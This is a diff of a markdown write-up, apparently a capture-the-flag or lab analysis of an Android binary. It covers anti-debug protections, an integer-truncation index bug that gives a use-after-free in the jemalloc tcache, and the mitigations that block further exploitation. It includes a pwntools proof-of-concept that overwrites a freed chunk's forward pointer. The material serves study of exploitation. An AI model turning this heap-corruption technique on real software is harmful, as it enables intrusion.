@@ -23,9 +23,11 @@ The binary is packed with pretty much every modern mitigation layer you can thin
 Before digging into the vulnerability, the binary tries to completely block debuggers, dynamic instrumentation (like Frida), or tracing tools by invoking strict Linux/Android environment protections.
 
 During dynamic and static analysis, I identified the following anti-debug/anti-tamper markers in the disassembly:
-```c
+
 prctl(0x26, 1, 0, 0, 0);
 syscall(0x115, 1, 0, &local_110);
+<img width="1434" height="103" alt="image" src="https://github.com/user-attachments/assets/19a31218-4d86-4542-b9c9-9801fb103b27" />
+
 
     prctl(0x26, 1, ...): Maps directly to PR_SET_DUMPABLE set to 0 (SUID_DUMP_DISABLE). It prevents the kernel from producing core dumps and disallows non-root users/debuggers from attaching via ptrace.
 
@@ -42,7 +44,8 @@ The application reads the user index as a 64-bit value, but when it actually goe
 Here is how that looks in Ghidra's decompiler:
 C
 
-if (((uint)local_100 < 8) && (*(long *)(&DAT_00109830 + (local_100 & 0xffffffff) * 8) != 0))
+    if (((uint)local_100 < 8) && (*(long *)(&DAT_00109830 + (local_100 & 0xffffffff) * 8) != 0))
+
 
 2. Bypassing the Bounds
 
@@ -58,59 +61,60 @@ Since the Edit and Show functions don't double-check if the slot was cleared or 
 Proof of Concept (PoC)
 
 Here is a quick Python script using pwntools to trigger the bug. It populates the Jemalloc tcache, hits the integer overflow via the massive index, and safely modifies the chunk structure without triggering a crash.
+
 Python
 
-from pwn import *
-import time
+    from pwn import *
+    import time
 
-# Spawning the process via ADB shell on the device
-p = process(['adb', 'shell', '/data/local/tmp/impossible'])
-time.sleep(0.5)
+    # Spawning the process via ADB shell on the device
+    p = process(['adb', 'shell', '/data/local/tmp/impossible'])
+    time.sleep(0.5)
 
-# The 64-bit magic index that truncates to 0
-BIG_IDX = b"4294967296" 
+    # The 64-bit magic index that truncates to 0
+    BIG_IDX = b"4294967296" 
 
-log.info("Populating heap structures...")
-# Allocation
-p.sendlineafter(b'>', b'2')
-p.sendlineafter(b':', b'0')
-p.sendlineafter(b':', b'32')
-p.sendafter(b':', b'AAAA')
+    log.info("Populating heap structures...")
+    # Allocation
+    p.sendlineafter(b'>', b'2')
+    p.sendlineafter(b':', b'0')
+    p.sendlineafter(b':', b'32')
+    p.sendafter(b':', b'AAAA')
 
-p.sendlineafter(b'>', b'2')
-p.sendlineafter(b':', b'1')
-p.sendlineafter(b':', b'32')
-p.sendafter(b':', b'BBBB')
+    p.sendlineafter(b'>', b'2')
+    p.sendlineafter(b':', b'1')
+    p.sendlineafter(b':', b'32')
+    p.sendafter(b':', b'BBBB')
 
-log.info("Freeing chunks to populate tcache...")
-p.sendlineafter(b'>', b'3')
-p.sendlineafter(b':', b'1')
-p.sendlineafter(b'>', b'3')
-p.sendlineafter(b':', b'0')
+    log.info("Freeing chunks to populate tcache...")
+    p.sendlineafter(b'>', b'3')
+    p.sendlineafter(b':', b'1')
+    p.sendlineafter(b'>', b'3')
+    p.sendlineafter(b':', b'0')
 
-log.info("Triggering UAF using the overflow index...")
-# Editing a freed chunk via our giant index primitive
-p.sendlineafter(b'>', b'5')
-p.sendlineafter(b':', BIG_IDX)
-p.sendafter(b':', b'EEFFFFGG') # Overwriting the tcache forward pointer
+    log.info("Triggering UAF using the overflow index...")
+    # Editing a freed chunk via our giant index primitive
+    p.sendlineafter(b'>', b'5')
+    p.sendlineafter(b':', BIG_IDX)
+    p.sendafter(b':', b'EEFFFFGG') # Overwriting the tcache forward pointer
 
-log.info("Testing heap stability...")
-p.sendlineafter(b'>', b'4')
-p.sendlineafter(b':', BIG_IDX)
+    log.info("Testing heap stability...")
+    p.sendlineafter(b'>', b'4')
+    p.sendlineafter(b':', BIG_IDX)
 
-# Dump output
-print(p.recvuntil(b'=== EXP', timeout=1).decode('latin-1', errors='ignore'))
-p.close()
+    # Dump output
+    print(p.recvuntil(b'=== EXP', timeout=1).decode('latin-1', errors='ignore'))
+    p.close()
 
 Current Roadblocks & Mitigation Barriers
 
 Even though the UAF is fully operational via BIG_IDX, getting code execution or a clean library leak is heavily blocked by how the environment is built:
 
-    Full RELRO: The Global Offset Table (.got) is marked Read-Only after the binary loads. Standard tcache poisoning tricks aimed at hijacking library functions (like free or malloc) just cause an immediate SigSegV on write.
+Full RELRO: The Global Offset Table (.got) is marked Read-Only after the binary loads. Standard tcache poisoning tricks aimed at hijacking library functions (like free or malloc) just cause an immediate SigSegV on write.
 
-    Strict Seccomp: The sandbox entirely disables execve and open. Traditional shellcode or simple file reading vectors are dead on arrival.
+Strict Seccomp: The sandbox entirely disables execve and open. Traditional shellcode or simple file reading vectors are dead on arrival.
 
-    ASLR & Restrictions: Everything is randomized. Since modern Android security blocks access to /proc/pid/maps, any out-of-bounds math or pointer shifting has to be done blindly, relying purely on relative chunk distances inside Jemalloc.
+ASLR & Restrictions: Everything is randomized. Since modern Android security blocks access to /proc/pid/maps, any out-of-bounds math or pointer shifting has to be done blindly, relying purely on relative chunk distances inside Jemalloc.
 
 Arbitrary Read Attempt via SIZE_ARRAY
 
